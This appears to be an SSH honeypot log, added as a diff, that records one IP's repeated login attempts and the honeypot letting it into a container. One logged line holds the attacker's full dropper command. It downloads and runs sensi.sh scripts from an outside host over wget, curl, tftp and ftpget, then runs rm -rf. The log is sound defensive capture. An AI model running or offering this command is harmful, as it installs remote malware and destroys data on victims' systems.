@@ -1,0 +1,73 @@
+2021-11-04 18:03:02.892 - [Info] MITM Version: 1.4
+2021-11-04 18:03:02.895 - [Info] Auto Access Enabled: true
+2021-11-04 18:03:02.895 - [Debug] [Init] Auto Access Barrier: true
+2021-11-04 18:03:02.902 - [Info] SSH man-in-the-middle server for 10.0.3.159 listening on 0.0.0.0:10003
+2021-11-04 18:03:45.541 - [Debug] [Connection] Attacker connected: 45.61.186.123 | Client Identification: SSH-2.0-libssh2_1.4.3
+2021-11-04 18:03:46.174 - [Debug] [Auth] Attacker 45.61.186.123 trying to authenticate with "password"
+2021-11-04 18:03:46.175 - [Debug] [Auto Access] Attacker: 45.61.186.123, Threshold: 1, Attempts: 1
+2021-11-04 18:03:46.175 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Container user is disabled
+2021-11-04 18:03:46.176 - [Debug] [Auth] Attacker: 45.61.186.123 has so far made 1 attempts. Remaining: 3 attempts
+2021-11-04 18:03:46.245 - [Debug] [Connection] Attacker closed the connection
+2021-11-04 18:05:41.812 - [Debug] [Connection] Attacker connected: 45.61.186.123 | Client Identification: SSH-2.0-libssh2_1.4.3
+2021-11-04 18:05:42.452 - [Debug] [Auth] Attacker 45.61.186.123 trying to authenticate with "password"
+2021-11-04 18:05:42.452 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Container user is disabled
+2021-11-04 18:05:42.453 - [Debug] [Auth] Attacker: 45.61.186.123 has so far made 1 attempts. Remaining: 3 attempts
+2021-11-04 18:05:42.553 - [Debug] [Connection] Attacker closed the connection
+2021-11-04 18:07:34.852 - [Debug] [Connection] Attacker connected: 45.61.186.123 | Client Identification: SSH-2.0-libssh2_1.4.3
+2021-11-04 18:07:35.520 - [Debug] [Auth] Attacker 45.61.186.123 trying to authenticate with "password"
+2021-11-04 18:07:35.521 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Container user is disabled
+2021-11-04 18:07:35.521 - [Debug] [Auth] Attacker: 45.61.186.123 has so far made 1 attempts. Remaining: 3 attempts
+2021-11-04 18:07:35.586 - [Debug] [Connection] Attacker closed the connection
+2021-11-04 18:09:27.281 - [Debug] [Connection] Attacker connected: 45.61.186.123 | Client Identification: SSH-2.0-libssh2_1.4.3
+2021-11-04 18:09:27.898 - [Debug] [Auth] Attacker 45.61.186.123 trying to authenticate with "password"
+2021-11-04 18:09:27.898 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Container user is disabled
+2021-11-04 18:09:27.899 - [Debug] [Auth] Attacker: 45.61.186.123 has so far made 1 attempts. Remaining: 3 attempts
+2021-11-04 18:09:27.958 - [Debug] [Connection] Attacker closed the connection
+2021-11-04 18:11:18.724 - [Debug] [Connection] Attacker connected: 45.61.186.123 | Client Identification: SSH-2.0-libssh2_1.4.3
+2021-11-04 18:11:19.359 - [Debug] [Auth] Attacker 45.61.186.123 trying to authenticate with "password"
+2021-11-04 18:11:19.360 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Container user is disabled
+2021-11-04 18:11:19.360 - [Debug] [Auth] Attacker: 45.61.186.123 has so far made 1 attempts. Remaining: 3 attempts
+2021-11-04 18:11:19.471 - [Debug] [Connection] Attacker closed the connection
+2021-11-04 18:13:12.974 - [Debug] [Connection] Attacker connected: 45.61.186.123 | Client Identification: SSH-2.0-libssh2_1.4.3
+2021-11-04 18:13:13.668 - [Debug] [Auth] Attacker 45.61.186.123 trying to authenticate with "password"
+2021-11-04 18:13:13.668 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Container user is disabled
+2021-11-04 18:13:13.669 - [Debug] [Auth] Attacker: 45.61.186.123 has so far made 1 attempts. Remaining: 3 attempts
+2021-11-04 18:13:13.792 - [Debug] [Connection] Attacker closed the connection
+2021-11-04 18:15:08.253 - [Debug] [Connection] Attacker connected: 45.61.186.123 | Client Identification: SSH-2.0-libssh2_1.4.3
+2021-11-04 18:15:08.878 - [Debug] [Auth] Attacker 45.61.186.123 trying to authenticate with "password"
+2021-11-04 18:15:08.879 - [Debug] [Auto Access] Compromising the honeypot
+2021-11-04 18:15:08.879 - [Debug] [Auto Access] Adding the following credentials: "user:user"
+2021-11-04 18:15:08.975 - [Debug] [Auth] Invalid credentials - Auth Anyways
+2021-11-04 18:15:08.975 - [Debug] [LXC] Attempting to connect to the honeypot: 10.0.3.159
+2021-11-04 18:15:09.034 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2021-11-04 18:15:09.168 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.61.184.103/sensi.sh; curl -O http://45.61.184.103/sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp 45.61.184.103 -c get sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp -r sensi2.sh -g 45.61.184.103; chmod 777 sensi2.sh; sh sensi2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.61.184.103 sensi1.sh sensi1.sh; sh sensi1.sh; rm -rf sensi.sh sensi.sh sensi2.sh sensi1.sh; rm -rf *
+2021-11-04 18:16:27.562 - [Debug] [Connection] Attacker closed connection
+2021-11-04 18:16:27.568 - [Debug] [LXC] Container's OpenSSH server ended connection
+2021-11-04 18:16:27.568 - [Debug] [LXC] Container's OpenSSH server closed connection
+2021-11-04 18:17:03.910 - [Debug] [Connection] Attacker connected: 45.61.186.123 | Client Identification: SSH-2.0-libssh2_1.4.3
+2021-11-04 18:17:04.533 - [Debug] [Auth] Attacker 45.61.186.123 trying to authenticate with "password"
+2021-11-04 18:17:04.533 - [Debug] [Auth] Invalid credentials - Auth Anyways
+2021-11-04 18:17:04.533 - [Debug] [LXC] Attempting to connect to the honeypot: 10.0.3.159
+2021-11-04 18:17:04.533 - [Debug] [Auth] Attacker authentication error: Too many attackers
+2021-11-04 18:17:04.534 - [Debug] [Auth] Attacker: 45.61.186.123 has so far made 1 attempts. Remaining: 3 attempts
+2021-11-04 18:17:04.534 - [Debug] [Auth] Attacker authentication error: Too many attackers
+2021-11-04 18:17:04.534 - [Debug] [Auth] Attacker: 45.61.186.123 has so far made 2 attempts. Remaining: 2 attempts
+2021-11-04 18:17:04.607 - [Debug] [Connection] Attacker closed the connection
+2021-11-04 18:18:56.428 - [Debug] [Connection] Attacker connected: 45.61.186.123 | Client Identification: SSH-2.0-libssh2_1.4.3
+2021-11-04 18:18:57.027 - [Debug] [Auth] Attacker 45.61.186.123 trying to authenticate with "password"
+2021-11-04 18:18:57.027 - [Debug] [Auth] Invalid credentials - Auth Anyways
+2021-11-04 18:18:57.028 - [Debug] [LXC] Attempting to connect to the honeypot: 10.0.3.159
+2021-11-04 18:18:57.028 - [Debug] [Auth] Attacker authentication error: Too many attackers
+2021-11-04 18:18:57.028 - [Debug] [Auth] Attacker: 45.61.186.123 has so far made 1 attempts. Remaining: 3 attempts
+2021-11-04 18:18:57.028 - [Debug] [Auth] Attacker authentication error: Too many attackers
+2021-11-04 18:18:57.028 - [Debug] [Auth] Attacker: 45.61.186.123 has so far made 2 attempts. Remaining: 2 attempts
+2021-11-04 18:18:57.090 - [Debug] [Connection] Attacker closed the connection
+2021-11-04 18:20:50.505 - [Debug] [Connection] Attacker connected: 45.61.186.123 | Client Identification: SSH-2.0-libssh2_1.4.3
+2021-11-04 18:20:51.184 - [Debug] [Auth] Attacker 45.61.186.123 trying to authenticate with "password"
+2021-11-04 18:20:51.185 - [Debug] [Auth] Invalid credentials - Auth Anyways
+2021-11-04 18:20:51.185 - [Debug] [LXC] Attempting to connect to the honeypot: 10.0.3.159
+2021-11-04 18:20:51.185 - [Debug] [Auth] Attacker authentication error: Too many attackers
+2021-11-04 18:20:51.185 - [Debug] [Auth] Attacker: 45.61.186.123 has so far made 1 attempts. Remaining: 3 attempts
+2021-11-04 18:20:51.185 - [Debug] [Auth] Attacker authentication error: Too many attackers
+2021-11-04 18:20:51.185 - [Debug] [Auth] Attacker: 45.61.186.123 has so far made 2 attempts. Remaining: 2 attempts
+2021-11-04 18:20:51.246 - [Debug] [Connection] Attacker closed the connection
